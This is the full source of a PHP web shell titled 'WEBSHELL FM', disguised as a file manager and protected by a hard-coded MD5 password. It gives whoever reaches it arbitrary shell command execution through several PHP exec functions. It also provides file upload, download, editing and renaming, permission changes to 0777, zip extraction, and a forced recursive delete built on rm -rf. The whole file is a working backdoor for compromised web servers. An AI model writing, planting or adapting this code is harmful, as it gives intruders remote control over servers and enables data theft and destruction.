<?php
// ===== WEBSHELL FM =====
// Password: admin123 (MD5: f0acdf779e440d2748d9cf57f1b9b3f6)

// ===== SESSION START =====
if (!session_id()) session_start();

$pass_hash = 'f0acdf779e440d2748d9cf57f1b9b3f6'; // MD5 dari 'admin123'

// ===== LOGIN CHECK =====
if (isset($_POST['p']) && md5($_POST['p']) === $pass_hash) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    echo '<!DOCTYPE html><html><head><style>body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}input,button{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:10px;border-radius:6px;}button{background:#0f0;color:#000;cursor:pointer;}</style></head><body><form method=post><input type=password name=p><button>Login</button></form></body></html>';
    exit;
}

if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();

// ========== FORCE DELETE - SUPER BRUTAL ==========
function force_delete($path) {
    if (!file_exists($path)) return true;
    @chmod($path, 0777);
    if (is_dir($path)) {
        if (function_exists('exec')) {
            exec('rm -rf "' . addslashes($path) . '" 2>&1', $o, $r);
            if ($r === 0 && !file_exists($path)) return true;
        }
        if (function_exists('system')) {
            system('rm -rf "' . addslashes($path) . '" 2>&1', $r);
            if ($r === 0 && !file_exists($path)) return true;
        }
        $files = @scandir($path);
        if ($files) {
            foreach ($files as $f) {
                if ($f == '.' || $f == '..') continue;
                $p = $path . '/' . $f;
                @chmod($p, 0777);
                if (is_dir($p)) force_delete($p);
                else { @chmod($p, 0777); @unlink($p); if (file_exists($p)) { @file_put_contents($p, ''); @unlink($p); } }
            }
        }
        @chmod($path, 0777);
        @rmdir($path);
        if (file_exists($path) && function_exists('exec')) {
            exec('rm -rf "' . addslashes($path) . '" 2>&1');
        }
        return !file_exists($path);
    } else {
        @chmod($path, 0777);
        @unlink($path);
        if (file_exists($path)) { @file_put_contents($path, ''); @unlink($path); }
        return !file_exists($path);
    }
}

// ===== ZIP & UNZIP =====
function zip_create($src, $dest, $files) {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($dest, ZipArchive::CREATE) !== true) return false;
    foreach ($files as $f) {
        $p = $src . '/' . $f;
        if (is_file($p)) $zip->addFile($p, $f);
        elseif (is_dir($p)) {
            $zip->addEmptyDir($f);
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($it as $file) {
                $rel = str_replace($p . '/', '', $file->getPathname());
                if ($file->isDir()) $zip->addEmptyDir($f . '/' . $rel);
                else $zip->addFile($file->getPathname(), $f . '/' . $rel);
            }
        }
    }
    return $zip->close();
}

function zip_extract($zip_path, $dest) {
    if (!is_dir($dest)) @mkdir($dest, 0777, true);
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path) === true) {
            if ($zip->extractTo($dest)) { $zip->close(); return true; }
            $zip->close();
        }
    }
    if (function_exists('exec') || function_exists('system')) {
        $cmd = 'unzip -o "' . $zip_path . '" -d "' . $dest . '" 2>&1';
        shell_exec($cmd);
        if (file_exists($dest) && count(scandir($dest)) > 2) return true;
    }
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path) === true) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                $filename = $dest . '/' . $stat['name'];
                $dirname = dirname($filename);
                if (!is_dir($dirname)) @mkdir($dirname, 0777, true);
                if ($stat['size'] == 0) @mkdir($filename, 0777, true);
                else @file_put_contents($filename, $zip->getFromIndex($i));
            }
            $zip->close();
            return true;
        }
    }
    return false;
}

// ===== AJAX HANDLER =====
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    $act = $_GET['ajax'];
    $res = array('ok' => false);
    
    if ($act == 'list') {
        $items = scandir($_SESSION['cwd']);
        $folders = array(); $files = array();
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $p = $_SESSION['cwd'] . '/' . $i;
            if (is_dir($p)) $folders[] = array('n' => $i, 'w' => is_writable($p));
            else $files[] = array('n' => $i, 's' => filesize($p), 'w' => is_writable($p));
        }
        $res = array('ok' => true, 'cwd' => $_SESSION['cwd'], 'f' => $folders, 'fs' => $files);
    }
    elseif ($act == 'cd') { $d = $_GET['d']; $nd = ($d[0]=='/')?$d:$_SESSION['cwd'].'/'.$d; if(is_dir($nd)) $_SESSION['cwd']=realpath($nd); $res=array('ok'=>true); }
    elseif ($act == 'del') { $f = $_SESSION['cwd'].'/'.$_GET['f']; force_delete($f); $res=array('ok'=>true); }
    elseif ($act == 'rmdir') { force_delete($_SESSION['cwd'].'/'.$_GET['f']); $res=array('ok'=>true); }
    elseif ($act == 'rename') { $o=$_SESSION['cwd'].'/'.$_GET['o']; $n=$_SESSION['cwd'].'/'.$_GET['n']; if(file_exists($o) && !file_exists($n)){@chmod($o,0777);@rename($o,$n);} $res=array('ok'=>true); }
    elseif ($act == 'chmod') { $t=$_SESSION['cwd'].'/'.$_GET['t']; if(file_exists($t)) @chmod($t,0777); $res=array('ok'=>true); }
    elseif ($act == 'mkdir') { $n=$_SESSION['cwd'].'/'.$_GET['n']; if(!is_dir($n)) @mkdir($n,0777,true); $res=array('ok'=>true); }
    elseif ($act == 'touch') { $n=$_SESSION['cwd'].'/'.$_GET['n']; if(!is_file($n)) @file_put_contents($n,''); $res=array('ok'=>true); }
    elseif ($act == 'load') { $f=$_SESSION['cwd'].'/'.$_GET['f']; if(is_file($f)) die(file_get_contents($f)); }
    elseif ($act == 'save') { $f=$_SESSION['cwd'].'/'.$_GET['f']; @chmod($f,0777); @file_put_contents($f, $_POST['c']); $res=array('ok'=>true); }
    elseif ($act == 'zip') { $f = json_decode($_GET['f'], true); $n = 'archive_'.date('ymd_His').'.zip'; zip_create($_SESSION['cwd'], $_SESSION['cwd'].'/'.$n, $f); $res=array('ok'=>true, 'n'=>$n); }
    elseif ($act == 'unzip') {
        $file = $_SESSION['cwd'] . '/' . $_GET['f'];
        $dest = isset($_GET['to']) ? $_SESSION['cwd'] . '/' . $_GET['to'] : dirname($file);
        if (is_file($file) && (pathinfo($file, PATHINFO_EXTENSION) == 'zip' || substr($file, -4) == '.zip')) {
            if (zip_extract($file, $dest)) $res = array('ok' => true, 'msg' => 'Extracted to ' . $dest);
            else $res = array('ok' => false, 'msg' => 'Extract failed');
        } else $res = array('ok' => false, 'msg' => 'Not a valid zip file');
    }
    elseif ($act == 'cmd') {
        $cmd = $_GET['cmd'];
        $output = '';
        if (function_exists('system')) { ob_start(); system($cmd); $output = ob_get_clean(); }
        elseif (function_exists('exec')) { exec($cmd, $o); $output = implode("\n", $o); }
        elseif (function_exists('shell_exec')) { $output = shell_exec($cmd); }
        elseif (function_exists('passthru')) { ob_start(); passthru($cmd); $output = ob_get_clean(); }
        $res = array('ok' => true, 'output' => $output);
    }
    echo json_encode($res);
    exit;
}

// ===== UPLOAD =====
if (isset($_FILES['up'])) {
    $t = $_SESSION['cwd'] . '/' . basename($_FILES['up']['name']);
    @move_uploaded_file($_FILES['up']['tmp_name'], $t);
    @chmod($t, 0777);
    echo json_encode(array('ok'=>true));
    exit;
}

// ===== DOWNLOAD =====
if (isset($_GET['dl'])) { 
    $f = $_SESSION['cwd'].'/'.$_GET['dl']; 
    if (is_file($f)) { 
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="'.basename($f).'"'); 
        readfile($f); 
    } 
    exit; 
}

// ===== HTML =====
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>📁 FM</title>
<style>
*{box-sizing:border-box;}
body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}
a{color:#0f0;text-decoration:none;cursor:pointer;}
a:hover{color:#ff0;}
table{width:100%;border-collapse:collapse;}
td,th{padding:8px;text-align:left;border-bottom:1px solid #333;}
input,button,textarea{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:8px;margin:5px;border-radius:6px;}
button{background:#0f0;color:#000;cursor:pointer;font-weight:bold;}
.folder{color:#ff0;font-weight:bold;}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;}
.modal-content{background:#0a0e12;margin:10% auto;padding:20px;width:80%;border-radius:12px;border:1px solid #0f0;}
textarea{width:100%;height:300px;}
.close{float:right;cursor:pointer;color:#f00;font-size:24px;}
.dropzone{min-height:80px;border:2px dashed #0f0;border-radius:12px;text-align:center;padding:15px;margin:10px 0;cursor:pointer;}
.dropzone.drag{border-color:#ff0;background:#1a1f2e;}
.cmd-box{background:#1a1f2e;padding:10px;border-radius:8px;margin:10px 0;border:1px solid #0f0;}
.cmd-box input{flex:1;min-width:200px;}
.cmd-box .output{background:#0a0e12;padding:10px;border-radius:4px;margin-top:8px;max-height:300px;overflow:auto;white-space:pre-wrap;font-family:monospace;font-size:13px;}
.flex{display:flex;flex-wrap:wrap;gap:5px;align-items:center;}
</style>
</head>
<body>

<h2>📁 FILE MANAGER</h2>
<div id="cwd">📍 <?php echo $_SESSION['cwd']; ?></div>
<hr>

<!-- ===== COMMAND BOX ===== -->
<div class="cmd-box">
    <div class="flex">
        <input type="text" id="cmdInput" placeholder="Enter command (e.g. ls -la, whoami, id)" style="flex:1;">
        <button onclick="runCommand()">▶ Run</button>
        <button onclick="document.getElementById('cmdOutput').innerHTML='';document.getElementById('cmdInput').value='';">🗑️ Clear</button>
    </div>
    <div id="cmdOutput" class="output">💻 Type a command and click Run</div>
</div>

<div class="dropzone" id="dropzone">📤 Drag & drop files here or click to upload</div>
<input type="file" id="fileInput" multiple style="display:none">

<div style="margin:10px 0">
    <input type="text" id="newFolder" placeholder="folder_name" style="width:130px">
    <button onclick="createFolder()">📁 Folder</button>
    <input type="text" id="newFile" placeholder="file.txt" style="width:130px">
    <button onclick="createFile()">📄 File</button>
    <button onclick="home()">🏠 Home</button>
    <button onclick="parentDir()">⬆️ Parent</button>
    <button onclick="selectAll()">☑ All</button>
    <button onclick="deleteSelected()">🗑️ Sel</button>
    <button onclick="zipSelected()">📦 Zip Sel</button>
</div>

<h3>📁 FOLDERS</h3>
<table id="foldersTable"><thead><tr><th><input type="checkbox" id="selectAllFolders" onclick="toggleSelectAll('folders')"></th><th>Name</th><th>Writable</th><th>Action</th></tr></thead><tbody></tbody></table>

<h3>📄 FILES</h3>
<table id="filesTable"><thead><tr><th><input type="checkbox" id="selectAllFiles" onclick="toggleSelectAll('files')"></th><th>Name</th><th>Size</th><th>Writable</th><th>Action</th></tr></thead><tbody></tbody></table>

<div id="modal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal()">&times;</span><h3>Edit: <span id="fn"></span></h3><textarea id="ta"></textarea><br><button onclick="saveFile()">💾 Save</button><button onclick="closeModal()">Cancel</button></div></div>

<script>
let currentCwd = '<?php echo $_SESSION['cwd']; ?>';

// ===== COMMAND =====
function runCommand() {
    var cmd = document.getElementById('cmdInput').value.trim();
    if(!cmd) return;
    var output = document.getElementById('cmdOutput');
    output.innerHTML = '⏳ Running...';
    
    if(cmd.startsWith('cd ')) {
        var target = cmd.substring(3).trim();
        if(target === '..') { parentDir(); output.innerHTML = '✅ Moved to parent'; document.getElementById('cmdInput').value = ''; return; }
        fetch('?ajax=cd&d=' + encodeURIComponent(target))
            .then(r=>r.json())
            .then(d=>{ if(d.ok) { load(); output.innerHTML = '✅ Moved to: ' + currentCwd; } else { output.innerHTML = '❌ Failed'; } })
            .catch(e=>{ output.innerHTML = '❌ Error: ' + e; });
        document.getElementById('cmdInput').value = '';
        return;
    }
    
    fetch('?ajax=cmd&cmd=' + encodeURIComponent(cmd))
        .then(r=>r.json())
        .then(d=>{ if(d.ok) { output.innerHTML = d.output || '(no output)'; } else { output.innerHTML = '❌ Error'; } })
        .catch(e=>{ output.innerHTML = '❌ Request failed'; });
}

document.getElementById('cmdInput').addEventListener('keydown', function(e) {
    if(e.key === 'Enter') runCommand();
});

function load() {
    fetch('?ajax=list').then(r=>r.json()).then(d=>{
        if(!d.ok)return;
        currentCwd = d.cwd;
        document.getElementById('cwd').innerHTML = '📍 ' + currentCwd;
        var fh = '', fih = '';
        for(var i=0; i<d.f.length; i++) {
            var f = d.f[i];
            var wc = f.w ? '#0f0' : '#f00';
            var wt = f.w ? '✅ Yes' : '❌ No';
            fh += '<tr><td><input type="checkbox" class="sel-folder" value="'+escapeHtml(f.n)+'"></td>';
            fh += '<td class="folder"><a onclick="cd(\''+escapeHtml(f.n)+'\')">📁 '+escapeHtml(f.n)+'</a></td>';
            fh += '<td style="color:'+wc+'">'+wt+'</td>';
            fh += '<td><a onclick="chmod(\''+escapeHtml(f.n)+'\')">🔓</a> | <a onclick="rename(\''+escapeHtml(f.n)+'\')">✏️</a> | <a onclick="rmdir(\''+escapeHtml(f.n)+'\')" style="color:#f00">🗑️</a></td></tr>';
        }
        for(var j=0; j<d.fs.length; j++) {
            var f = d.fs[j];
            var sz = f.s < 1024 ? f.s+' B' : (f.s<1048576 ? (f.s/1024).toFixed(1)+' KB' : (f.s/1048576).toFixed(1)+' MB');
            var wc = f.w ? '#0f0' : '#f00';
            var wt = f.w ? '✅ Yes' : '❌ No';
            fih += '<tr><td><input type="checkbox" class="sel-file" value="'+escapeHtml(f.n)+'"></td>';
            fih += '<td>📄 '+escapeHtml(f.n)+'</td>';
            fih += '<td>'+sz+'</td>';
            fih += '<td style="color:'+wc+'">'+wt+'</td>';
            fih += '<td><a onclick="dl(\''+escapeHtml(f.n)+'\')">⬇️</a> | <a onclick="edit(\''+escapeHtml(f.n)+'\')">✏️</a> | <a onclick="unzip(\''+escapeHtml(f.n)+'\')" style="color:#ff0">📦 Unzip</a> | <a onclick="rename(\''+escapeHtml(f.n)+'\')">🔄</a> | <a onclick="del(\''+escapeHtml(f.n)+'\')" style="color:#f00">🗑️</a> | <a onclick="chmod(\''+escapeHtml(f.n)+'\')">🔓</a></td></tr>';
        }
        document.querySelector('#foldersTable tbody').innerHTML = fh;
        document.querySelector('#filesTable tbody').innerHTML = fih;
        document.getElementById('selectAllFolders').checked = false;
        document.getElementById('selectAllFiles').checked = false;
    });
}

function cd(d) { fetch('?ajax=cd&d='+encodeURIComponent(d)).then(load); }
function home() { fetch('?ajax=cd&d='+encodeURIComponent('<?php echo getcwd(); ?>')).then(load); }
function parentDir() { fetch('?ajax=cd&d=..').then(load); }
function del(f) { if(confirm('Delete '+f+'?')) fetch('?ajax=del&f='+encodeURIComponent(f)).then(load); }
function rmdir(f) { if(confirm('Force delete '+f+'?')) fetch('?ajax=rmdir&f='+encodeURIComponent(f)).then(load); }
function chmod(t) { fetch('?ajax=chmod&t='+encodeURIComponent(t)).then(load); }
function createFolder() { var n=document.getElementById('newFolder').value; if(n) fetch('?ajax=mkdir&n='+encodeURIComponent(n)).then(load); document.getElementById('newFolder').value=''; }
function createFile() { var n=document.getElementById('newFile').value; if(n) fetch('?ajax=touch&n='+encodeURIComponent(n)).then(load); document.getElementById('newFile').value=''; }
function rename(oldN) { var newN=prompt('Rename to:',oldN); if(newN&&newN!==oldN) fetch('?ajax=rename&o='+encodeURIComponent(oldN)+'&n='+encodeURIComponent(newN)).then(load); }
function dl(f) { window.location.href='?dl='+encodeURIComponent(f); }
function edit(f) { document.getElementById('fn').innerText=f; fetch('?ajax=load&f='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('ta').value=d;document.getElementById('modal').style.display='block';window.cf=f;}); }
function saveFile() { var c=document.getElementById('ta').value; fetch('?ajax=save&f='+encodeURIComponent(window.cf),{method:'POST',body:'c='+encodeURIComponent(c),headers:{'Content-Type':'application/x-www-form-urlencoded'}}).then(()=>{closeModal();load();}); }
function closeModal() { document.getElementById('modal').style.display='none'; }
function escapeHtml(s){return s.replace(/[&<>]/g,function(m){return m=='&'?'&amp;':m=='<'?'&lt;':'>';});}

function toggleSelectAll(type) {
    var cb = document.querySelectorAll(type=='folders'?'.sel-folder':'.sel-file');
    var chk = document.getElementById('selectAll'+ (type=='folders'?'Folders':'Files'));
    for(var i=0; i<cb.length; i++) cb[i].checked=chk.checked;
}
function selectAll() {
    var items = document.querySelectorAll('.sel-folder, .sel-file');
    for(var i=0; i<items.length; i++) items[i].checked=true;
}
function deleteSelected() {
    var folders = document.querySelectorAll('.sel-folder:checked');
    var files = document.querySelectorAll('.sel-file:checked');
    if(folders.length + files.length == 0) { alert('Nothing selected'); return; }
    if(!confirm('Delete ' + folders.length + ' folders and ' + files.length + ' files?')) return;
    var p = [];
    for(var i=0; i<folders.length; i++) p.push(fetch('?ajax=rmdir&f=' + encodeURIComponent(folders[i].value)));
    for(var j=0; j<files.length; j++) p.push(fetch('?ajax=del&f=' + encodeURIComponent(files[j].value)));
    Promise.allSettled(p).then(function(results) {
        var success = results.filter(r => r.status === 'fulfilled' && r.value.ok).length;
        var failed = results.length - success;
        if(failed > 0) alert('✅ ' + success + ' deleted, ❌ ' + failed + ' failed');
        else alert('✅ All ' + success + ' items deleted');
        load();
    });
}
function zipSelected() {
    var all = [];
    document.querySelectorAll('.sel-folder:checked, .sel-file:checked').forEach(function(el) { all.push(el.value); });
    if(all.length==0) return alert('Nothing selected');
    fetch('?ajax=zip&f='+encodeURIComponent(JSON.stringify(all))).then(r=>r.json()).then(d=>{if(d.ok) alert('✅ Created: '+d.n); load();});
}

function unzip(f) {
    var dest = prompt('Extract to folder (leave empty for same directory):', '');
    if (dest === null) return;
    var url = '?ajax=unzip&f=' + encodeURIComponent(f);
    if (dest) url += '&to=' + encodeURIComponent(dest);
    fetch(url).then(r=>r.json()).then(d=>{
        alert(d.ok ? '✅ ' + d.msg : '❌ ' + d.msg);
        if (d.ok) load();
    });
}

// Drag & drop upload
var dropzone = document.getElementById('dropzone');
var fileInput = document.getElementById('fileInput');
dropzone.addEventListener('click',function(){fileInput.click();});
dropzone.addEventListener('dragover',function(e){e.preventDefault();dropzone.classList.add('drag');});
dropzone.addEventListener('dragleave',function(){dropzone.classList.remove('drag');});
dropzone.addEventListener('drop',function(e){e.preventDefault();dropzone.classList.remove('drag');var f=e.dataTransfer.files;if(f.length) uploadFiles(f);});
fileInput.addEventListener('change',function(){if(fileInput.files.length) uploadFiles(fileInput.files);});
function uploadFiles(files) {
    for(var i=0; i<files.length; i++){
        var fd=new FormData();
        fd.append('up',files[i]);
        fetch('',{method:'POST',body:fd}).then(load);
    }
}

load();
</script>
</body>
</html>
<?php
exit;
?>
